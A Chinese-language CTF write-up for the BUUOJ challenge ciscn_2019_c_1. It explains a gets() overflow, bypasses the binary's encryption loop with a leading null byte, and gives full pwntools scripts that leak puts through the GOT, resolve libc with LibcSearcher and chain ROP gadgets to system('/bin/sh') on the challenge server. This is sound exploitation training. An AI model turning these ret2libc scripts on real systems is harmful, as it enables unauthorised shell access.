[https://buuoj.cn/challenges#ciscn_2019_c_1](https://buuoj.cn/challenges#ciscn_2019_c_1)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/63770584/1771995332552-2245f5f1-04d6-4d62-be25-bc021e3b2729.png)

64位，只开nx

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/63770584/1771995380877-2734bd50-289b-465e-866e-80d7263d8f1c.png)

运行一下，发现只有1是有用的，在ida中

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/63770584/1771995415763-3c6cc18b-a8d4-44cf-b291-311f602664eb.png)

gets是漏洞函数，但是下面有加密过程，也就是说我们构造的rop会被加密破坏，因此我们需要绕过加密

14行只要v0>=strlen（s）就能跳出加密，而strlen遇到'\0'会停止

在函数列表和字符串列表均没有找到system和binsh，因此我们判断这是一道通过泄露libc地址来完成的一道libc题



我们找一个在程序中已经使用过的函数，这里我们找到puts，通过puts的got表和plt表来泄露puts的地址

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/63770584/1771996049115-baf9d723-4635-408a-8e12-5aa5b581285c.png)

泄露地址：



```python
from pwn import *

p=process('./cisc')
elf=ELF('./cisc')

rdi=0x400c83
ret=0x4006b9
main=elf.sym['main']
got=elf.got['puts']
plt=elf.plt['puts']
payload=b'\0'+b'a'*0x57+p64(rdi)+p64(got)+p64(plt)+p64(main)

p.recvuntil('Input your choice!\n')
p.sendline(str(1))
p.recvuntil('Input your Plaintext to be encrypted\n')
p.sendline(payload)
p.recvline()
p.recvline()
puts=u64(p.recvline().ljust(8, b'\x00'))

print(hex(puts))

```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/63770584/1772002703344-c496571e-5383-4be9-a207-2c56f306b86f.png)

这里我们看到puts的真实地址后3位是be0

我们到网站上来找

[https://libc.blukat.me/](https://libc.blukat.me/)

这里我们直接用libcsearch来写吧

最终代码



```python
from pwn import *
from LibcSearcher import *

p=remote('node5.buuoj.cn',26530)
elf=ELF('./cisc')

rdi=0x400c83
ret=0x4006b9
main=elf.sym['main']
got=elf.got['puts']
plt=elf.plt['puts']
payload1=b'\0'+b'a'*0x57+p64(rdi)+p64(got)+p64(plt)+p64(main)

p.recvuntil('Input your choice!\n')
p.sendline(str(1))
p.recvuntil('Input your Plaintext to be encrypted\n')
p.sendline(payload1)
p.recvline()
p.recvline()
#puts=u64(p.recvline().ljust(8, b'\x00'))这样是打不通的
puts=u64(p.recvuntil('\n')[:-1].ljust(8,b'\0'))

print(hex(puts))
libc=LibcSearcher('puts',puts)
base=puts-libc.dump('puts')
#选1就行
system=base+libc.dump('system')
binsh=base+libc.dump('str_bin_sh')

payload2=b'\0'+b'a'*0x57+p64(ret)+p64(rdi)+p64(binsh)+p64(system)
p.recvuntil('Input your choice!\n')
p.sendline(str(1))
p.recvuntil('Input your Plaintext to be encrypted\n')
p.sendline(payload2)

p.interactive()

```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/63770584/1772007147611-afa831dc-4416-4459-b756-e62b470c17ac.png)



